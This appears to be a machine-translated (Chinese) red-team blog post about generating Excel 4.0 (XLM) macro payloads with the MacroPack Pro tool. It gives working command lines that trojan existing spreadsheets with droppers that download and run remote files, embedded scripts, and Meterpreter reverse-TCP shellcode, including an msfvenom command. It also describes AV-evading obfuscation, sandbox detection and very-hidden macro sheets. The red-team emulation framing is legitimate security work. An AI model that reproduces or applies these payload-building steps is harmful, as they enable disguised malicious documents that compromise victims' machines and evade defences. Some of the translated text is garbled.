## 1.关于

近年来，恶意操作人员普遍使用Excel 4.0宏（也称为XLM），并且一些研究人员（红色或蓝色）也对其进行了分析和评论。  
近年来，这种格式已被广泛使用，因为它被AV检测到的可能性较小，而且AMSI不对其进行处理。  
我改进了MacroPack Pro，以支持这些老式Excel 4.0宏的生成，在本文中，您将找到我实现的一些XLM功能和一些演示。

注意：在这篇文章中，我解释了一些我实现的机制，但是由于MacroPack Pro的功能，它是仅用于合法使用的商业工具，因此将不提供生成器源代码。

## 2\. EXCEL 4.0宏（XLM）简介

### 2.1 XLM？

Excel 4.0于1992年发布。它是根据基于表格中单元格中输入的指令的Macro系统发布的。它是我们称为Excel 4.0 Macro或XLM的那些宏。

1.  \=ALERT("Hello world!")
    
2.  \=HALT()
    

  

Excel 5.0于1993年发布，并引入了VBA。似乎令人难以置信，但我们正在谈论的是1992年以来的一项技术，一年后被VBA取代，在我撰写本文时（2020年9月）仍得到支持！

在过去的几年中，Excel 4.0宏在包括武器化和混淆在内的恶意软件中的使用越来越多（请查看lastline.com上的这篇文章）。因此，对于Redteam而言，拥有模拟此类攻击的工具非常重要。  
关于安全研究人员，最新资源指向Stan Hegt fom Outflank为DerbyCon 2018准备的精彩文章。  
我强烈建议阅读他的博客文章，以了解RedTeam使用XLM的基础。  
无论如何，我将Excel 4.0移植到MacroPack（仅Pro版本）是合乎逻辑的。

### 2.2一些实现技巧

**使用国际**  
宏表XLM宏表就像常规的excel表一样，它们取决于语言。  
例如，这是Arno0x Github的摘录，为法语版本的Excel实现了一些XLM shellcode注入。

```
1.  \= REGISTRE（“ Kernel32” ; “ CreateThread” ; “ JJJJJJJ” ; “ CThread” ;; 1; 9）
    
2.  \= VAlloc（0; 4096; 4096; 64）
    
3.  \= SELECTIONNER（B1：B50; B1）
    
4.  \= POSER.VALEUR（C1; 0）
    
5.  \= TANT.QUE（CELLULE.ACTIVE（）<> “ END”）
    
```

为了避免必须用每种语言实现有效载荷，MacroPack使用了国际宏表，允许用英语编写所有内容。  
这对应于XlSheetType枚举类型的xlExcel4IntlMacroSheet值

**使用变量**  
很多恶意XLM有效负载示例都不依赖变量。我认为，使用变量的代码更易于阅读和使用。  
这里有些例子：

1.  empcmd="hello"
    
2.  \=IF(LEN(targCell)=0,RETURN(),)
    
3.  counter=1
    

另外，XLM单元具有可容纳的最大char数（255），这也是使用变量存储字符串的一个很好的理由。  
与单元格不同，变量不受大小限制（或者我不知道限制）

### 2.3使用MacroPack生成有效载荷

要生成XLM格式的Excel有效负载，请在命令行中添加—xlm选项。此选项与大多数MacroPack模板以及多个选项兼容。  
例如，通过cmd生成执行记事本的混淆Excel XLM有效内容：  
`echo “cmd.exe /c notepad.exe” | macro_pack.exe -o -t CMD --xlm -G test.xls`

与VBA基本有效内容类似，您可以使用-T（-trojan）选项对现有文档进行特洛伊木马：  
`echo “cmd.exe /c notepad.exe” | macro_pack.exe -o -t CMD --xlm -T existingdoc.xlsx`

## 3\. MacroPack模板支持

目前，XLM选项仅在使用MacroPack模板时可用。  
如果您不熟悉MacroPack，则必须知道它具有一系列与常用redteam用法相对应的预定义模板（文件嵌入，droppers，shellcode注入等）  
。这些模板中的大多数都与-xlm选项兼容。

### 3.1执行命令

可以通过EXEC指令或使用win32 API（例如shellexecute）完成简单的执行。

MacroPack命令行生成命令行执行有效负载：  
`echo "calc.exe" | macro_pack.exe -t CMD -G runcalc.xls --xlm`

### 3.2下载并执行文件

下一个滴管MacroPack模板支持—xlm选项：

DROPPER（下载并执行文件）

DROPPER\_PS（通过DLL下载并执行Powershell脚本）

DROPPER\_DLL（下载并加载DLL）

  

这是用于使用XLM滴管木马Excel工作表的命令行：  
echo https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe | macro\_pack.exe -t DROPPER -o -xlm-隐身-T samples \\ Risk\_Mgt\_ToolBox\_v1.0.xls

在此处查看相应的视频：

https://www.youtube.com/embed/58bNS5pu\_EM 

### 3.3嵌入并运行另一个文件

我已将文件嵌入功能移植到XLM有效负载（-embed选项）

下一个嵌入MacroPack模板的文件支持—xlm选项：

*   EMBED\_RUN（嵌入将被删除并执行的文件）
    
*   EMBED\_DROP（嵌入将被删除但不执行的文件）
    
*   EMBED\_DLL（嵌入将被删除并加载的dll）
    

在下面的示例中，我们将VBS脚本嵌入XLM宏中，启用宏后，该脚本将被删除并执行。  
`macro_pack.exe -t EMBED_RUN --embed=something.vbs -o -G embed_run.xls --xlm`

### 3.4 Shellcode注入

MacroPack XLM有效负载支持嵌入和运行原始shellcode（32位和64位）。  
我想指出Shellcode注入XLM功能的多个公共实现中的问题。  
Shellcode通常编码为一列（每个单元255字节）。然后使用*\= SELECT*运算符选择此列，然后通过*ACTIVE.CELL（）引用*选定的单元格  
。问题是该机制与隐藏的宏表不兼容。因此，对于MacroPack，我使用了一个命名变量来指向当前的shellcode单元。  
从MacroPack有效负载中提取：

```
1.  colPoint = E1-> E1** is **shellcode column
    
2.  lineCpt = 0
    
3.  \= WHILE（LEN（colPoint）<> 0）
    
```

这是用于使用XLM加载meterpreter反向TCP原始shellcode来木马Excel工作表的命令行：  
`echo meterx86_no0.bin | macro_pack.exe -t SHELLCODE -o --xlm --stealth -T samples\Risk_Mgt_ToolBox_v1.0.xlsx`

看看下面的视频，看看它是如何运行的：

https://www.youtube.com/embed/58bNS5pu\_EM 

与基于VBA / VBS的有效负载类似，XLM选项支持大的原始Shellcode。  
例如，MacroPack可用于生成有效载荷，该有效载荷在内存中运行meterpreter无阶段shellcode（177ko）。

注意： XLM字符串操作会将NULL字符视为字符串结尾。请记住从原始shellcode中删除\\ x00 char。例如，要创建不带NULL字符的反向TCP Meterpreter有效负载：  
`msfvenom -p windows/meterpreter/reverse_tcp LPORT=5555 LHOST=192.168.56.1 -f raw  -b '\x00'  -o meterx86_no0.bin`

## 4.一些安全绕过功能

### 4.1一些反反转

**沙箱检测**  
我添加了基本的沙箱检测功能，例如使用*\= GET.WORKSPACE（26）*  
查找用户名，我还通过环境变量查看处理器的数量。将来有多种改进途径。

**隐藏宏表**  
默认情况下，当您添加XLM宏表时，Excel表单中会出现一个“宏”选项卡，该选项卡不是很谨慎。

![](../Images/76c5ccd7214277cfa057ba29413c7c1b.png)

如果使用“-stealth”选项，MacroPack将隐藏通过设置宏表*可见*，以参数*xlSheetVeryHidden*。  
在Microsoft文档xlSheetVeryHidden上，您可以阅读：“隐藏对象，以便使该对象再次可见的唯一方法是将该属性设置为True（用户无法使该对象可见）。”

**混淆**  
我为XLM负载添加了一些代码混淆。我试图研究研究人员或恶意软件编写者的现有公共混淆方法，但是这些方法通常由Windows Defender检测到（当没有明文有效负载时）。  
我最终实现了自己的混淆机制，Defender和我测试的大多数AV都没有检测到这种混淆机制。

注意：关于混淆，似乎一般AV在检测明文XLM有效载荷方面非常不好，但是对于混淆的XLM或VBA / VBS有一些检测方法。我认为对于时间较短的Redteamer来说，实现许多反反转功能可能并不是一件令人费解的事情，而是希望尽快获得成功并确保绕过AV。因此，有时有时未混淆的有效负载会更好。这只是个人想法，请告诉我您对此有何看法;）。

### 4.2 XLM注入

我实现的一种非常好的机制称为XLM注入。它允许从非Excel格式的有效负载（例如Word，HTA，帮助文件等）注入并运行内存中的Excel 4.0宏。  
这个功能很复杂，我专门为此专门撰写了另一篇文章。

我很高兴终于在MacroPack中添加了XLM支持。它与MP Pro的2.0.0版本一起发布。
